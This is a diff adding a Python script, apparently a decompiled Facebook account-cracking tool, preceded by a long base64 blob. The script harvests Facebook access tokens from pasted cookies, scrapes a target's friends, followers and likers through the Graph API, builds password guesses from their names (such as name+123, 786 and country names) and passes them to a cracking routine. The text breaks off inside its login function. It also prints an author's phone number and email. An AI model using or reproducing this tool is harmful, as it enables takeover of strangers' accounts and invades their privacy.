+JZYAWM2X16KJr9Xl2kAPzMPDVRYrXueUenLjn0xXET3ogpTac4Lo1sgejkNI4Ivv8rDJ7+4+//N3L/zf7+72g/Rxry74CbOgnuzkGcU4cRSi4osMSA95GCAkPg2FQBMfISiFxgMCq2QnJSonpecY2wOGm1iP74hYO4DT222eFpL3HO70z05i2jGZbxEowx8oaaujWDLgnILZOXckYBOcHIwKkPH88ZOfd7Bu+vUNjWrDAFr/jypATAGSuTAwp6lJH6qzJpwF8T/spb8HHmkO1XqzVqOyzn1IJOUoWVifh2brku74G1EYSIc4PdCcGiia9mIUGnollUPbBu8Cy7kQW8l3nlLWU3LMVljLx9c1IVU/Y6PSigTIRPgPH09zh7pE3qtVqtfnf3Pjf4vRD8O2YYoO9HFHBA1RoCcnxI0LSbogjpC9bPX/P9EPQZWIsg2p2Jf1cVUWgkXRPkDjAA0xF2SrTkKiUqTf7f/7SkyPP7f+ZojVCbzGSowPYfSIQq46hjczBdX1IUKT6Y/9SdhiQhYlP3YKFGspBTMVoA5QD7SCp0xaDUrz73GBlA4WXwlR1mTIkLZU6ARu8hQYPC5LBHi1wYoIpVW8p406M9KOHs1X0kpmSWty4qkkMMJf+Lb8FnEX2mC9+2Lccj70ARle4jJo8HoTQ8tIQb1rFtRh3yboRNuQyZ9dglb3zTxEqs1iUR2Ymm9plJOtwBj8hkgC+dwQPAzDa5YOAz6O49xefvUzygPUuFvbzIoMWIa5ZRnWXWRvtmDq9mzd6W4FsZHlK0r/GSqyE7zw/fnpx0jshh57ATn705J8fFUefob53j15DjF9BEfz47/uuCjPmrnkDIX15fHJwdvgAfoBWlqKXVe3580jkhr446r/O1pvPm5ZvO38jzzslZ5+AoV57j08vjFbN0/vbib1CtXGlP3z7vXBwdv1mpgAvfA9vsbY9OcyV/wz+Op+SQ3eRr8K89sJzzpu5gbHUARirPlfwlNYzAAVuS9IiafEDzpZUtPGE3nIL5tCBPko39ITMToYPEUsh6sEAEnWwwKDtidG+OB5fIG06oFM7CLPsTtwg9T02fGk/ckhaj+KSvmwDZnAOSCJgd/QO6Akfnq4JVvuYhw+jN6g3djka/Vs6t4gcy6BPPg/0UP805HebJHQiYGTirRQBiNstqvr/Kig4Vefk87a1H28Y+fvys5gmTTVoFIii5g9NR3Ii2yaaE7DYLUykCbP9ewBQWfmHOlCQh1hv3AqkoVbkqgbN9YE163GRzEMzuSTezsG7C1qpUKjnpIDX6enX26ppc0BuwaC8tEi7Ynz+CkBPswXkEbI6BiQjYjMB8p++J2fsJo/BqZhCifXhNXtxg126TU/ApPea+N9M9MLAMnTmxtfCWW5mMEzMwU3tzxBPO5mDHEvIB6YpVzN1uu13odieUm91uQZQVmdA35B6xfcOQUw6DGuF9EEv+gZxSn7weUpvixE1//Oz/A22+dv0=")))
+# Decompile by JEECK X Los Dool
+# with (uncompyle6) version : 3.7.4
+# Time Succes decompile : 2021-10-12 15:47:11.403269
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+from urllib.parse import quote
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+H = "\x1b[0;92m" # Hijau
+K = "\x1b[0;93m" # Kuning
+B = "\x1b[0;94m" # Biru
+U = "\x1b[0;95m" # Ungu
+O = "\x1b[0;96m" # Biru Muda
+N = "\033[0m"    # Warna Mati
+url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=testlicence&apikey='
+host = "https://mbasic.facebook.com"
+ok = []
+cp = []
+ttl = []
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
+bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
+try:
+    if bu < 0 or bu > 12:
+        exit()
+    buTemp = bu - 1
+except ValueError:
+    exit()
+op = bulan[buTemp]
+tanggal = ("%s-%s-%s"%(ha,op,ta))
+ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
+ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
+ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+def jalan(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.04)
+def mlaku(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+def clear():
+    if "linux" in sys.platform.lower():os.system("clear")
+    elif "win" in sys.platform.lower():os.system("cls")
+    else:os.system("clear")
+def banner():
+    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sAuthor: %sAhmed Alzwage %s& %sWa:+218921762445\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/1000xxxx\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sAhmedalzwage.02\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/ahmedalzwage\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
+def menu_log():
+    os.system('rm -rf token.txt')
+    clear()
+    banner()
+    var_menu()
+    pmu = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+    print('%s║'%(O))
+    if pmu in ['']:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu_log()
+    elif pmu in ['1','01','001','a']:
+        defaultua()
+        token = input('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
+        try:
+            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
+            y = json.loads(x.text)
+            n = y['name']
+            xd = open("token.txt", "w")
+            xd.write(token)
+            xd.close()
+            #print('%s║'%(O))
+            #jalan('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
+            exit(BeautifulSoup.main())
+            #menu()
+        except (KeyError,IOError):
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+            os.system('rm -rf token.txt')
+            menu_log()
+        except requests.exceptions.ConnectionError:
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+            exit()
+    elif pmu in ['2','02','002','b']:
+        defaultua()
+        cookie = input('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))
+        try:
+            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
+            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
+            "referer"                   : "https://m.facebook.com/",
+            "host"                      : "m.facebook.com",
+            "origin"                    : "https://m.facebook.com",
+            "upgrade-insecure-requests" : "1",
+            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control"             : "max-age=0",
+            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+            "content-type"              : "text/html; charset=utf-8"
+            }, cookies = {
+            "cookie"                    : cookie
+            })
+            find_token = re.search("(EAAA\w+)", data.text)
+            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
+            xd = open("token.txt", "w")
+            xd.write(find_token.group(1))
+            xd.close()
+            #print('%s║'%(O))
+            #jalan('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
+            exit(BeautifulSoup.main())
+            #menu()
+        except requests.exceptions.ConnectionError:
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+            exit()
+        except (KeyError,IOError,AttributeError):
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P))
+            os.system('rm -rf token.txt')
+            menu_log()
+    elif pmu in ['3','03','003','c']:
+        clear()
+        banner()
+        var_tutor()
+        pf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+        print('%s║'%(O))
+        if pf in ['']:
+            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+            menu_log()
+        elif pf in ['1','01','001','a']:
+            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+            menu_log()
+        elif pf in ['2','02','002','b']:
+            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+            menu_log()
+        elif pf in ['3','03','003','c']:
+            os.system('xdg-open https://facebook.com/BHAIDADAHO')
+            tutor_target()
+            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+            menu_log()
+        elif pf in ['4','04','004','d']:
+            tutor_crack()
+            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+            menu_log()
+        else:
+            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+            menu_log()
+    elif pmu in ['4','04','004','d']:
+        clear()
+        banner()
+        var_author()
+        input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+        menu_log()
+    elif pmu in ['0','00','000','e']:
+        jalan('%s╠══[%s!%s] %sThank You For Using This SC'%(O,P,O,P))
+        jalan('%s╚══[%s!%s] %sHave a Nice Day :)\n'%(O,P,O,P))
+        os.system('rm -rf token.txt')
+        clear()
+        exit()
+    else:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu_log()
+def menu():
+    clear()
+    banner()
+    try:
+        lisensi = open("license.txt","r").read()
+        wl = requests.get(url_license + lisensi)
+        wk = json.loads(wl.text)
+        kun = lisensi.split('-')
+        users = wk['username']
+        mailerts = wk['email'].split('@')
+        mailert1 = mailerts[0]
+        mailert2 = mailerts[1]
+        mailer = mailert1[:2]
+        maile = (mailer+'xxxxx@'+mailert2)
+        bergabung = wk['joined']
+        kadaluarsa = wk['expired']
+        status = ('%sPremium [%sPro%s]'%(O,P,O))
+        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O))
+        pro = ''
+        upgrade = 'Ganti License Key'
+        jid = ''
+    except (KeyError,IOError):
+        status = 'P R E M I U M'
+        users = '-'
+        maile = '-'
+        kunci = '-'
+        bergabung = '-'
+        kadaluarsa = '-'
+        pro = ("%s[%sPro%s]"%(O,P,O))
+        upgrade = ('Upgrade To Version %s--'%(O))
+        jid = ('%s[%s50000%s]'%(O,P,O))
+    try:
+        token = open("token.txt","r").read()
+        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
+        y = json.loads(x.text)
+        n = y['name']
+        i = y['id']
+    except (KeyError,IOError):
+        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
+        print('%s║'%(M))
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        menu_log()
+    except requests.exceptions.ConnectionError:
+        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
+        print('%s║'%(M))
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
+    try:
+        ip = a["query"]
+    except KeyError:
+        ip = " "
+    print('%s╔══[ %sWellcome %s %s]'%(O,P,n,O))
+    print('%s║'%(O))
+    print('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
+    print('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))
+    print('%s║'%(O))
+    print('%s╠══[%s•%s] %sStatus : %s'%(O,P,O,P,status))
+    print('%s╠══[%s•%s] %sName : Ahmed Alzwage %s'%(O,P,O,P,users))
+    print('%s╠══[%s•%s] %sEmail : ahmedalzwage.01@gmail.com%s'%(O,P,O,P,maile))
+    print('%s╠══[%s•%s] %sKey : Xxxxxxxx%s'%(O,P,O,P,kunci))
+    print('%s╠══[%s•%s] %sJoin Since : 29-12-2021%s'%(O,P,O,P,bergabung))
+    print('%s╠══[%s•%s] %sValid until : 2030%s'%(O,P,O,P,kadaluarsa))
+    print('%s║'%(O))
+    print('%s╠══[%s1%s] %sCrack From Public %s'%(O,P,O,P,jid))
+    print('%s╠══[%s2%s] %sCrack From Follower %s'%(O,P,O,P,jid))
+    print('%s╠══[%s3%s] %sCrack From likes post %s'%(O,P,O,P,jid))
+    print('%s╠══[%s4%s] %sRetrieve Target Data'%(O,P,O,P))
+    print('%s╠══[%s5%s] %sTaking Number of Friends %s'%(O,P,O,P,pro))
+    print('%s╠══[%s6%s] %sCheck Crack Results'%(O,P,O,P))
+    print('%s╠══[%s7%s] %sCheck Crack Result Options %s'%(O,P,O,P,pro))
+    print('%s╠══[%s8%s] %sUser Agent'%(O,P,O,P))
+    print('%s╠══[%s9%s] %s%s'%(O,P,O,P,upgrade))
+    print('%s╠══[%s0%s] %sLog Out'%(O,P,O,P))
+    pm = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+    print('%s║'%(O))
+    if pm in ['']:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu()
+    elif pm in ['1','01','001','a']:
+        publik()
+    elif pm in ['2','02','002','b']:
+        pengikut()
+    elif pm in ['3','03','003','c']:
+        likers()
+    elif pm in ['4','04','004','d']:
+        target()
+    elif pm in ['5','05','005','e']:
+        teman_target()
+    elif pm in ['6','06','006','f']:
+        hasil()
+    elif pm in ['7','07','007','g']:
+        cek_hasil()
+    elif pm in ['8','08','008','h']:
+        ugen()
+    elif pm in ['9','09','009','i']:
+        buy_license()
+    elif pm in ['0','00','000','j']:
+        jalan('%s╚══[%s!%s] %sSee you later'%(O,P,O,P))
+        os.system('rm -rf token.txt')
+        menu_log()
+    else:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu()
+def defaultua():
+    ua = ua_nokia
+    try:
+        ugent = open('ugent.txt','w')
+        ugent.write(ua)
+        ugent.close()
+    except (KeyError,IOError):
+        menu_log()
+def ugen():
+    var_ugen()
+    pmu = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+    print('%s║'%(O))
+    if pmu in[""]:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+        menu()
+    elif pmu in ['1','01','001','a']:
+        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
+        input('%s╚══[ %sBack %s]%s'%(O,P,O,P))
+        menu()
+    elif pmu in ['2','02','002','b']:
+        os.system("rm -rf ugent.txt")
+        ua = input("%s╚══[%s•%s] %sEnter User Agent : \n\n"%(O,P,O,P))
+        try:
+            ugent = open('ugent.txt','w')
+            ugent.write(ua)
+            ugent.close()
+            jalan("\n%s╔══[ %sSuccesfully Changed User Agent %s]"%(O,P,O))
+            print('%s║'%(O))
+            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+            menu()
+        except (KeyError,IOError):
+            jalan("\n%s╔══[ %sFailed to Change User Agent %s]"%(M,P,M))
+            print('%s║'%(M))
+            input('%s╚══[ %sBack %s]%s'%(M,P,M,P))
+            menu()
+    elif pmu in ['3','03','003','c']:
+        ugen_hp()
+    elif pmu in ['4','04','004','d']:
+        os.system("rm -rf ugent.txt")
+        jalan("%s╠══[ %sUser Agent Deleted Successfully %s]"%(O,P,O))
+        print('%s║'%(O))
+        input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+        menu()
+    elif pmu in ['5','05','005','e']:
+        try:
+            ungser = open('ugent.txt', 'r').read()
+        except (KeyError,IOError):
+            ungser = 'Not Found'
+        print("%s╚══[%s•%s] %sYour User Agent  : \n\n%s%s"%(O,P,O,P,O,ungser))
+        jalan("\n%s╔══[ %sThis is your current user agent %s]"%(O,P,O))
+        print('%s║'%(O))
+        input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+        menu()
+    elif pmu in ['0','00','000','f']:
+        menu()
+    else:
+        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+def ugen_hp():
+    os.system("rm -rf ugent.txt")
+    print('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
+    print('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
+    print('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
+    print('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
+    print('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
+    print('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
+    print('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
+    pc = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+    print('%s║'%(O))
+    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    elif pc in ['1','01']:
+        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
+    elif pc in ['2','02']:
+        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
+    elif pc in ['3','03']:
+        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
+    elif pc in ['4','04']:
+        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
+    elif pc in ['5','05']:
+        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
+    elif pc in ['6','06']:
+        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
+    elif pc in ['7','07']:
+        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
+    elif pc in ['8','08']:
+        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    jalan("%s╠══[ %sSuccessfully Changed User Agent %s]"%(O,P,O))
+    print('%s║'%(O))
+    input('%s╚══[ %sBack %s]%s'%(O,P,O,P))
+    menu()
+def publik():
+    try:
+        lisensi = open("license.txt","r").read()
+        wl = requests.get(url_license + lisensi)
+        wk = json.loads(wl.text)
+        wj = wk['username']
+        jid = '5000'
+    except (KeyError,IOError):
+        jid = '5000'
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        token = open("token.txt","r").read()
+        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
+        y = json.loads(x.text)
+        n = y['name']
+    except (KeyError,IOError):
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        menu_log()
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        print('%s╠══[%s•%s] %sINPUT ID'%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        try:
+            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
+            ob = json.loads(pb.text)
+            print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
+        except (KeyError,IOError):
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
+            menu()
+        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
+        id = []
+        z = json.loads(r.text)
+        xc = (ob["first_name"]+".json").replace(" ","_")
+        xb = open(xc,"w")
+        for a in z["data"]:
+            id.append(a["id"]+"•"+a["name"])
+            xb.write(a["id"]+"•"+a["name"]+"\n")
+        xb.close()
+        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        return crack(xc)
+    except Exception as e:
+        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
+def pengikut():
+    try:
+        lisensi = open("license.txt","r").read()
+        wl = requests.get(url_license + lisensi)
+        wk = json.loads(wl.text)
+        wj = wk['username']
+        jid = '10000'
+    except (KeyError,IOError):
+        jid = '5000'
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        token = open("token.txt","r").read()
+        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
+        y = json.loads(x.text)
+        n = y['name']
+    except (KeyError,IOError):
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        menu_log()
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        print('%s╠══[%s•%s] %sInput ID '%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        try:
+            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
+            ob = json.loads(pb.text)
+            print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
+        except (KeyError,IOError):
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
+            menu()
+        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
+        id = []
+        z = json.loads(r.text)
+        xc = (ob["first_name"]+".json").replace(" ","_")
+        xb = open(xc,"w")
+        for a in z["data"]:
+            id.append(a["id"]+"•"+a["name"])
+            xb.write(a["id"]+"•"+a["name"]+"\n")
+        xb.close()
+        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        return crack(xc)
+    except Exception as e:
+        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
+def likers():
+    try:
+        lisensi = open("license.txt","r").read()
+        wl = requests.get(url_license + lisensi)
+        wk = json.loads(wl.text)
+        wj = wk['username']
+        jid = '10000'
+    except (KeyError,IOError):
+        jid = '5000'
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        token = open("token.txt","r").read()
+        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
+        y = json.loads(x.text)
+        n = y['name']
+    except (KeyError,IOError):
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        menu_log()
+    except requests.exceptions.ConnectionError:
+        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        exit()
+    try:
+        print('%s╠══[%s•%s] %sINPUT ID'%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        try:
+            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
+            ob = json.loads(pb.text)
+            print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
+        except (KeyError,IOError):
+            print('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
+            menu()
+        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
+        id = []
+        z = json.loads(r.text)
+        xc = (ob["first_name"]+".json").replace(" ","_")
+        xb = open(xc,"w")
+        for a in z["data"]:
+            id.append(a["id"]+"•"+a["name"])
+            xb.write(a["id"]+"•"+a["name"]+"\n")
+        xb.close()
+        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        return crack(xc)
+    except Exception as e:
+        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
+def generate1(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:
+            continue
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"786")
+                _dapunta_.append(i+"1122")
+            elif len(i)>=6:
+                _dapunta_.append(i)
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"786")
+                _dapunta_.append(i+"1122")
+            else:
+                continue
+    _dapunta_.append(_cici_.lower())
+    return _dapunta_
+def generate2(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:
+            continue
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"1122")
+                _dapunta_.append(i+"786")
+            else:
+                _dapunta_.append(i)
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"1122")
+                _dapunta_.append(i+"786")
+    _dapunta_.append(_cici_.lower())
+    _dapunta_.append("indonesia")
+    _dapunta_.append("sayangkamu")
+    _dapunta_.append("bangsat")
+    return _dapunta_
+def generate3(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:
+            continue
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"1122")
+                _dapunta_.append(i+"786")
+            else:
+                _dapunta_.append(i)
+                _dapunta_.append(i+"123")
+                _dapunta_.append(i+"12345")
+                _dapunta_.append(i+"1234")
+                _dapunta_.append(i+"1122")
+                _dapunta_.append(i+"786")
+    _dapunta_.append(_cici_.lower())
+    _dapunta_.append("pakistan")
+    _dapunta_.append("pakistan123")
+    _dapunta_.append("786786")
+    _dapunta_.append("khankhan")
+    _dapunta_.append("223344")
+    _dapunta_.append("khan1234")
+    return _dapunta_
+def generate4(_cici_):
+    _dapunta_=[]
+    ps = open('pass.txt','r').read()
+    pp = open('passangka.txt','r').read()
+    for i in _cici_.split(" "):  
+        i=i.lower()
+        if len(i)<3:continue
+        elif len(i)==3 or len(i)==4 or len(i)==5:
+            _dapunta_.append(i+"123")
+            _dapunta_.append(i+"12345")
+            _dapunta_.append(i+"1234")
+            _dapunta_.append(i+"1122")
+            _dapunta_.append(i+"786")
+        else:
+            _dapunta_.append(i)
+            _dapunta_.append(i+"123")
+            _dapunta_.append(i+"12345")
+            _dapunta_.append(i+"1234")
+            _dapunta_.append(i+"1122")
+            _dapunta_.append(i+"786")
+    if pp in ['',' ','  ']:pass
+    else:
+        for i in _cici_.split(" "):  
+            i=i.lower()
+            for x in pp.split(','):
+                _dapunta_.append(i+x)
+    if ps in ['',' ','  ']:pass
+    else:
+        for z in ps.split(','):
+            _dapunta_.append(z)
+    _dapunta_.append(_cici_.lower())
+    return _dapunta_
+def tambah_pass():
+    print('%s║'%(O))
+    print('%s╠══[%s•%s] %sFor Example :  jeeck,123456,786786'%(O,P,O,P))
+    cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P))
+    gh = open('pass.txt','w')
+    gh.write(cuy)
+    gh.close
+def tambah_pass_angka():
+    print('%s╠══[%s•%s] %sFor Example : 321,786,1122,123'%(O,P,O,P))
+    coy = input('%s╠══[%s•%s] %sEnter Additional Pass Behind Name : '%(O,P,O,P))
+    xy = open('passangka.txt','w')
+    xy.write(coy)
+    xy.close
+    
+def log_api(em,pas,hosts):
+    ua = open('ugent.txt','r').read()
+    r = requests.Session()
